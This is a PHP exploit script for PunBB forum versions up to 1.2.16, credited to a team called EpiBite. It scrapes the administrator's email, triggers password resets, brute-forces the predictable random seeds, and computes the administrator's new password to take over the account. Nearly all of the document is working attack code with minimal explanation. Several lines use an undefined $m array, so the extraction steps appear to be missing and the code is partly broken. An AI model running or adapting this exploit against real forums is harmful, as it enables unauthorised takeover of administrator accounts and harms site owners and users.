PunBB <= 1.2.16 Blind Password Recovery Exploit
===============================================



<?php
/**
 * Thanks to Stefan Esser, here&#039;s the exploit.
 *
 * Team : EpiBite
 * firefox, petit-poney, thot
 * Nous tenons a remercier nos mamans et papas respectifs.
 * Let&#039;s get a fu*** coffee !
 */

// conf
define(&#039;URL&#039;, &#039;http://localhost/punbb_1-2-16_fr/upload&#039;);	// base url
define(&#039;EMAIL&#039;, &#039;login_x@epitech.net&#039;);				// your email
define(&#039;LOGIN&#039;, &#039;login_x&#039;);					// your login
define(&#039;PASS&#039;, &#039;620553.8I73&#039;);					// your pass
// Exploit
printf("--\nUrl : %s\nEmail : %s\n--\n", URL, EMAIL);
$h = curl_init();
curl_setopt($h, CURLOPT_URL,
URL.&#039;/userlist.php?username=&show_group=-1&sort_by=registered&sort_dir=ASC&search=Envoyer&#039;);
curl_setopt($h, CURLOPT_RETURNTRANSFER, 1);
$s = curl_exec($h);
define(&#039;ADMIN&#039;, $m[2]);
if (count($m))
  define(&#039;DATE&#039;, mktime(0, 0, 0, $m[2], $m[3], $m[1]));
else
  define(&#039;DATE&#039;, time() - 86400); //just in case, the forum or account just has been created
printf("Admin : %s\nDate : %s\n--\n", ADMIN, DATE);
$h = curl_init();
curl_setopt($h, CURLOPT_URL, URL.&#039;/login.php?action=forget_2&#039;);
// curl_setopt($h, CURLOPT_PROXY, &#039;proxies.epitech.net:3128&#039;);
curl_setopt($h, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($h, CURLOPT_HEADER, 1);
curl_setopt($h, CURLOPT_POST, 1);
curl_setopt($h, CURLOPT_POSTFIELDS, implode(&#039;&&#039;, array(&#039;form_sent=1&#039;,
						       &#039;req_email=&#039;.urlencode(EMAIL),
						       &#039;request_pass=Envoyer&#039;)));
define(&#039;ADMIN_MAIL&#039;, $m[1]); // Admin email (normally automatically get, set manually if there&#039;s problem)
printf("Admin mail : %s\n--\n", ADMIN_MAIL);
$h = curl_init();
curl_setopt($h, CURLOPT_URL, URL.&#039;/login.php?action=forget_2&#039;);
curl_setopt($h, CURLOPT_RETURNTRANSFER, 1);
// curl_setopt($h, CURLOPT_PROXY, &#039;proxies.epitech.net:3128&#039;);
curl_setopt($h, CURLOPT_COOKIE,
&#039;punbb_cookie=&#039;.rawurlencode(serialize(array(0 => 2, 1 =>
md5(&#039;bite&#039;)))));
curl_setopt($h, CURLOPT_HEADER, 1);
curl_setopt($h, CURLOPT_POST, 1);
curl_setopt($h, CURLOPT_POSTFIELDS, implode(&#039;&&#039;, array(&#039;form_sent=1&#039;,
						       &#039;req_email=&#039;.urlencode(ADMIN_MAIL),
						       &#039;request_pass=Envoyer&#039;)));
$s = curl_exec($h);
$c = unserialize(urldecode($m[1]));
define(&#039;MD5_NOT_LOGGUED&#039;, $c[1]);
printf("Md5 not loggued : %s\n--\n", MD5_NOT_LOGGUED);
$h = curl_init();
curl_setopt($h, CURLOPT_URL, URL.&#039;/login.php?action=in&#039;);
curl_setopt($h, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($h, CURLOPT_HEADER, 1);
// curl_setopt($h, CURLOPT_PROXY, &#039;proxies.epitech.net:3128&#039;);
curl_setopt($h, CURLOPT_POST, 1);
curl_setopt($h, CURLOPT_POSTFIELDS, implode(&#039;&&#039;, array(&#039;form_sent=1&#039;,
						       &#039;redirect_url=index.php&#039;,
						       &#039;req_username=&#039;.LOGIN,
						       &#039;req_password=&#039;.PASS)));
$s = curl_exec($h);
$c = unserialize(urldecode($m[1]));
define(&#039;MD5_LOGGUED&#039;, $c[1]);
printf("Md5 loggued : %s\n--\n", MD5_LOGGUED);
define(&#039;PASS_MD5ED&#039;, sha1(PASS));
$chars = array(&#039;/&#039;, &#039;-&#039;, "\\", &#039;|&#039;);
for ($p = 0; $p < 86400 * 2; $p++)
{
  if (!($p % 300))
    echo $chars[($p / 300) % 4]."\r";
  if (strcmp(MD5_LOGGUED, md5(substr(md5((int)(DATE + $p)),
-8).PASS_MD5ED)) == 0)
    {
      define(&#039;SEED&#039;, substr(md5(DATE + $p), -8));
      break;
    }
}
printf("Seed : %s\n--\n", SEED);
for ($p = 0; $p < 1000000; $p++)
{
  if (!($p % 300))
    echo $chars[($p / 300) % 4]."\r";
  mt_srand((double)$p);
  if (strcmp(md5(SEED.random_pass(8)), MD5_NOT_LOGGUED) == 0)
    {
      define(&#039;SRAND&#039;, $p);
      break;
    }
}
printf("SRAND : %s\n--\n", SRAND);
mt_srand(SRAND);
random_pass(8);
printf("New password : %s\n--\n", random_pass(8));
$url = URL.&#039;/profile.php?id=2&action=change_pass&key=&#039;.random_pass(8);// Id is set to &#039;2&#039; (the admin&#039;s id, but you can change your target)
$h = curl_init();
curl_setopt($h, CURLOPT_URL, $url);
curl_setopt($h, CURLOPT_RETURNTRANSFER, 1);
curl_exec($h);
function random_pass($len)
{
  $chars = &#039;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#039;;
  $password = &#039;&#039;;
  for ($i = 0; $i < $len; ++$i)
    $password .= substr($chars, (mt_rand() % strlen($chars)), 1);
  return $password;
}



